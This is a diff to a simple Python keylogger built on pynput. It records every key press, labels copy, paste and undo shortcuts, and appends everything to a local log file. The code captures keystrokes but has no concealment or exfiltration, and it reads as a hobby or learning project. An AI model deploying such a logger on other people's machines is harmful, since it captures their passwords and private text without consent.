@@ -1,6 +1,7 @@
 from pynput.keyboard import Listener
 
 
+
 def key_formatter(inputString):
     """A simple function that polishes the input characters before they get added to the logfile"""
 
@@ -39,7 +40,7 @@ def key_formatter(inputString):
 
     # While logging, the script will keep track of any copy/paste/cut/undo operations.
 
-    if inputString.startswith("\\x"):
+    if inputString.startswith("\\x"): #CTRL codes
         if inputString == "\\x03":
             inputString = " CTRL_C " #copy
         elif inputString == "\\x16":
@@ -52,22 +53,22 @@ def key_formatter(inputString):
             inputString = " CTRL_A " #select all
         elif inputString == "\\x19":
             inputString = " CTRL_Y " #redo
-        else: inputString = "" #ignore all others        
-
+        
     return inputString
 
 
 def log_keystroke(key):
     """This is the logging function: every keyboard input is read and added to the logfile"""
 
-    inputString = str(key).replace("'", "")
+    inputString = str(key).replace("'", "") #needs fixing: the " ' " character is ignored if written by the user
     inputString = key_formatter(inputString)
-
-    with open("src\log.txt", 'a') as f:
+    
+    with open("src\log.txt", 'a', encoding='utf-8') as f:
         f.write(inputString)
 
 
-# The "with" keyword will automatically close the listener.
-# It always makes sure that the memory allocated to it will be released, no matter what.
-with Listener(on_press=log_keystroke) as l:
-    l.join()
+def start_listener():
+    # The "with" keyword will automatically close the listener.
+    # It always makes sure that the memory allocated to it will be released, no matter what.
+    with Listener(on_press=log_keystroke) as l:
+        l.join()
